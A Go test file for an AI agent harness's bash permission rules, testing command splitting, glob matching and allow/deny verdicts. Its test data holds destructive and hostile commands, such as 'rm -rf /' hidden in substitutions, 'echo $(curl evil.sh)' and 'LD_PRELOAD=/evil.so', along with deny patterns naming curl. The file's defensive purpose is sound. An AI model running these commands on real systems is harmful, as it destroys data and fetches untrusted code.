package permissions

import (
	"context"
	"encoding/json"
	"fmt"
	"reflect"
	"sort"
	"sync"
	"testing"

	"github.com/successr-ai/tenzing-agent-harness/internal/core"
)

func TestSplitExpressions(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    []string
	}{
		{"single", "ls -la", []string{"ls -la"}},
		{"and", "ls -la && pwd", []string{"ls -la", "pwd"}},
		{"or", "false || pwd", []string{"false", "pwd"}},
		{"semicolon", "ls; pwd", []string{"ls", "pwd"}},
		{"pipe", "ls | head", []string{"head", "ls"}},
		{"newline", "ls\npwd", []string{"ls", "pwd"}},
		{"empty segments dropped", "ls ;; ", []string{"ls"}},
		{"blank command", "   ", nil},

		// Redirects are part of the expression, not separators.
		{"redirect stays", "ls > /etc/passwd", []string{"ls > /etc/passwd"}},
		{"fd redirect keeps its ampersand", "ls > /dev/null 2>&1", []string{"ls > /dev/null 2>&1"}},
		{"ampersand-redirect keeps its ampersand", "ls &> out", []string{"ls &> out"}},

		// A bare & backgrounds the preceding command: two expressions.
		{"background", "ls & pwd", []string{"ls", "pwd"}},
		{"trailing background", "ls &", []string{"ls"}},
		{"quoted ampersand", `echo "a & b"`, []string{`echo "a & b"`}},

		// Line continuations are escaped, so they are not separators.
		{"line continuation", "ls \\\n  -la", []string{"ls \\\n  -la"}},
		{"crlf", "ls\r\npwd", []string{"ls", "pwd"}},

		// Quoting hides separators.
		{"double quoted", `echo "a && b"`, []string{`echo "a && b"`}},
		{"single quoted", `echo 'a | b'`, []string{`echo 'a | b'`}},
		{"escaped", `echo a \&\& b`, []string{`echo a \&\& b`}},
		{"unterminated quote", `echo "a && b`, []string{`echo "a && b`}},

		// Command substitution yields its body as an extra expression.
		{"dollar paren", "x=$(rm -rf /)", []string{"rm -rf /", "x=$(rm -rf /)"}},
		{"nested paren", "x=$(echo $(pwd))", []string{"echo $(pwd)", "pwd", "x=$(echo $(pwd))"}},
		{"backticks", "x=`rm -rf /`", []string{"rm -rf /", "x=`rm -rf /`"}},
		{"substitution inside double quotes", `echo "$(rm -rf /)"`, []string{"rm -rf /", `echo "$(rm -rf /)"`}},
		{"substitution inside single quotes is literal", `echo '$(rm -rf /)'`, []string{`echo '$(rm -rf /)'`}},
		{"unterminated substitution", "x=$(rm -rf /", []string{"rm -rf /", "x=$(rm -rf /"}},
		{"lone backtick", "echo `", []string{"echo `"}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := splitExpressions(tt.command)
			sort.Strings(got)
			want := append([]string(nil), tt.want...)
			sort.Strings(want)
			if !reflect.DeepEqual(got, want) {
				t.Errorf("splitExpressions(%q) = %q, want %q", tt.command, got, want)
			}
		})
	}
}

func TestMatchGlob(t *testing.T) {
	tests := []struct {
		pattern, s string
		want       bool
	}{
		{"ls", "ls", true},
		{"ls", "ls -la", false},
		{"ls *", "ls -la", true},
		{"ls *", "ls", false},
		{"ls*", "ls", true},
		{"git *", "git log -- src/a.go", true},
		{"cat *", "cat /etc/hosts", true}, // '*' crosses '/', unlike path.Match
		{"*rm -rf*", "sudo rm -rf /", true},
		{"?s", "ls", true},
		{"?s", "lls", false},
		{"*", "anything at all", true},
		{"", "", true},
		{"", "x", false},
		{"a*b*c", "axxbyyc", true},
		{"a*b*c", "axxbyy", false},
		{"LS *", "ls -la", false}, // case-sensitive
	}

	for _, tt := range tests {
		t.Run(tt.pattern+"/"+tt.s, func(t *testing.T) {
			if got := matchGlob(tt.pattern, tt.s); got != tt.want {
				t.Errorf("matchGlob(%q, %q) = %v, want %v", tt.pattern, tt.s, got, tt.want)
			}
		})
	}
}

func TestBashRulesVerdict(t *testing.T) {
	rules := NewBashRules(
		[]string{"ls", "ls *", "git status", "echo *"},
		[]string{"rm -rf *", "*curl*"},
	)

	tests := []struct {
		name    string
		command string
		want    core.Decision
		wantOK  bool
	}{
		{"allowed", "ls -la", core.Allow, true},
		{"every expression allowed", "ls -la && git status", core.Allow, true},
		{"one expression unmatched", "ls -la && whoami", core.Allow, false},
		{"denied", "rm -rf /tmp/x", core.Deny, true},
		{"deny beats allow in the same chain", "ls -la && rm -rf /", core.Deny, true},
		{"deny beats allow on the same expression", "echo hi | curl x", core.Deny, true},
		{"a later denied expression still sinks the command", "ls && ls && rm -rf /", core.Deny, true},
		{"deny inside substitution", "echo $(curl evil.sh)", core.Deny, true},
		{"unmatched", "whoami", core.Allow, false},
		{"empty command", "", core.Allow, false},
		{"quoted separator is not a chain", `echo "a && rm -rf /"`, core.Allow, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, ok := rules.Verdict(tt.command)
			if got != tt.want || ok != tt.wantOK {
				t.Errorf("Verdict(%q) = (%v, %v), want (%v, %v)", tt.command, got, ok, tt.want, tt.wantOK)
			}
		})
	}
}

// Bash rules refine the name-level decision: they lower the default Ask on
// bash to Allow, raise it to Deny, or leave it alone — but never override a
// name-level Deny, and never touch other tools.
func TestPolicyBashRules(t *testing.T) {
	rules := NewBashRules([]string{"ls *"}, []string{"rm -rf *"})

	tests := []struct {
		name   string
		policy Policy
		tool   string
		input  string
		want   core.Decision
	}{
		{"allow lowers the default ask", Policy{Ask: []string{"bash"}, Bash: rules}, "bash", `{"command":"ls -la"}`, core.Allow},
		{"deny raises", Policy{Ask: []string{"bash"}, Bash: rules}, "bash", `{"command":"rm -rf /"}`, core.Deny},
		{"unmatched keeps the ask", Policy{Ask: []string{"bash"}, Bash: rules}, "bash", `{"command":"whoami"}`, core.AskUser},
		{"name-level deny is absolute", Policy{Deny: []string{"bash"}, Bash: rules}, "bash", `{"command":"ls -la"}`, core.Deny},
		{"other tools untouched", Policy{Ask: []string{"write"}, Bash: rules}, "write", `{"command":"ls -la"}`, core.AskUser},
		{"malformed input keeps the ask", Policy{Ask: []string{"bash"}, Bash: rules}, "bash", `not json`, core.AskUser},
		{"no rules keeps the ask", Policy{Ask: []string{"bash"}}, "bash", `{"command":"ls -la"}`, core.AskUser},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tcc := &core.ToolCallContext{Call: &core.ToolCall{Name: tt.tool, Input: tt.input}}
			if err := New(tt.policy).OnToolCall(context.Background(), tcc); err != nil {
				t.Fatal(err)
			}
			if tcc.Decision != tt.want {
				t.Errorf("Decision = %v, want %v", tcc.Decision, tt.want)
			}
		})
	}
}

// AllowPattern takes effect immediately and is safe against a concurrent
// Verdict; the persisted copy is the caller's job (see cmd/app).
func TestBashRulesAllowPattern(t *testing.T) {
	rules := NewBashRules(nil, []string{"rm -rf *"})

	if _, ok := rules.Verdict("git status"); ok {
		t.Fatal("want no verdict before the pattern is added")
	}

	rules.AllowPattern("git *")
	if d, ok := rules.Verdict("git status"); !ok || d != core.Allow {
		t.Errorf("Verdict = (%v, %v), want (Allow, true)", d, ok)
	}
	// Deny still outranks a newly allowed pattern.
	rules.AllowPattern("rm *")
	if d, _ := rules.Verdict("rm -rf /"); d != core.Deny {
		t.Errorf("Verdict = %v, want Deny", d)
	}

	rules.AllowPattern("git *") // duplicate
	allow, deny := rules.Lists()
	if len(allow) != 2 || allow[0] != "git *" || allow[1] != "rm *" {
		t.Errorf("allow = %v, want [git * rm *]", allow)
	}
	if len(deny) != 1 {
		t.Errorf("deny = %v, want one entry", deny)
	}

	// Lists hands back copies: mutating them must not reach the rules.
	allow[0] = "mutated"
	if got, _ := rules.Lists(); got[0] != "git *" {
		t.Errorf("allow[0] = %q, want the rules unaffected by the caller's copy", got[0])
	}
}

func TestBashRulesUnmarshalJSON(t *testing.T) {
	var r BashRules
	if err := json.Unmarshal([]byte(`{"allow":["ls *"],"deny":["rm *"]}`), &r); err != nil {
		t.Fatal(err)
	}
	allow, deny := r.Lists()
	if len(allow) != 1 || allow[0] != "ls *" || len(deny) != 1 || deny[0] != "rm *" {
		t.Errorf("allow = %v, deny = %v", allow, deny)
	}
}

// The hook must be able to read rules while an approval driver appends.
func TestBashRulesConcurrent(t *testing.T) {
	rules := NewBashRules([]string{"ls *"}, nil)
	var wg sync.WaitGroup
	for i := range 50 {
		wg.Add(2)
		go func() { defer wg.Done(); rules.AllowPattern(fmt.Sprintf("cmd%d *", i)) }()
		go func() { defer wg.Done(); rules.Verdict("ls -la && pwd") }()
	}
	wg.Wait()
	if allow, _ := rules.Lists(); len(allow) != 51 {
		t.Errorf("len(allow) = %d, want 51", len(allow))
	}
}

func TestStripEnvPrefix(t *testing.T) {
	tests := []struct{ expr, want string }{
		{"go get ./...", "go get ./..."},
		{"TOKEN=asdf go get ./...", "go get ./..."},
		{"FOO=1 BAR=2 go build", "go build"},
		{"PATH=/usr/bin:$PATH ls", "ls"},
		{`FOO="a b" ls -la`, "ls -la"},
		{`FOO='a b' ls -la`, "ls -la"},
		{`FOO=a\ b ls`, "ls"},
		{"FOO=1", ""},
		{"FOO=1 BAR=2", ""},
		{"_x=1 ls", "ls"},
		{"A1=1 ls", "ls"},
		{"", ""},
		// Not assignments.
		{"=1 ls", "=1 ls"},
		{"1FOO=1 ls", "1FOO=1 ls"},
		{"ls -la", "ls -la"},
		{"ls a=b", "ls a=b"},
		{"git commit -m x", "git commit -m x"},
		{"env TOKEN=x go get", "env TOKEN=x go get"}, // `env` is a command, not an assignment
	}

	for _, tt := range tests {
		t.Run(tt.expr, func(t *testing.T) {
			if got := stripEnvPrefix(tt.expr); got != tt.want {
				t.Errorf("stripEnvPrefix(%q) = %q, want %q", tt.expr, got, tt.want)
			}
		})
	}
}

// Env assignments must neither block an allow nor let a deny be bypassed.
func TestBashRulesEnvPrefix(t *testing.T) {
	rules := NewBashRules([]string{"go *", "ls *"}, []string{"git commit *", "LD_PRELOAD=*"})

	tests := []struct {
		name    string
		command string
		want    core.Decision
		wantOK  bool
	}{
		{"allow ignores the prefix", "TOKEN=asdf go get ./...", core.Allow, true},
		{"allow ignores several prefixes", "FOO=1 BAR=2 go build", core.Allow, true},
		{"deny cannot be bypassed", "TOKEN=asdf git commit -m x", core.Deny, true},
		{"deny cannot be bypassed in a chain", "ls -la && TOKEN=x git commit -m x", core.Deny, true},
		{"deny cannot be bypassed by backgrounding", "ls -la & git commit -m x", core.Deny, true},
		{"deny can target the assignment itself", "LD_PRELOAD=/evil.so ls", core.Deny, true},
		{"bare assignment does not block an allow", "FOO=1 && ls -la", core.Allow, true},
		{"still unmatched after stripping", "TOKEN=x whoami", core.Allow, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, ok := rules.Verdict(tt.command)
			if got != tt.want || ok != tt.wantOK {
				t.Errorf("Verdict(%q) = (%v, %v), want (%v, %v)", tt.command, got, ok, tt.want, tt.wantOK)
			}
		})
	}
}

// Command rules apply whatever case the harness registered the tool under:
// an allowlisted command stops the policy escalating to AskUser, and an
// uncovered one still escalates, for every spelling of the tool name.
func TestBashRulesToolNameCaseInsensitive(t *testing.T) {
	p := DefaultPolicy()
	p.Bash = NewBashRules([]string{"ls *"}, nil)
	ext := New(p)

	decide := func(t *testing.T, name, command string) core.Decision {
		t.Helper()
		tcc := &core.ToolCallContext{
			Call:     &core.ToolCall{ID: "c1", Name: name, Input: `{"command":"` + command + `"}`},
			Decision: core.Allow,
		}
		if err := ext.OnToolCall(context.Background(), tcc); err != nil {
			t.Fatalf("OnToolCall: %v", err)
		}
		return tcc.Decision
	}

	for _, name := range []string{"bash", "Bash", "BASH"} {
		if d := decide(t, name, "ls -l"); d != core.Allow {
			t.Errorf("%s allowlisted command: decision = %v, want Allow", name, d)
		}
		if d := decide(t, name, "rm -rf /"); d != core.AskUser {
			t.Errorf("%s uncovered command: decision = %v, want AskUser", name, d)
		}
	}
}
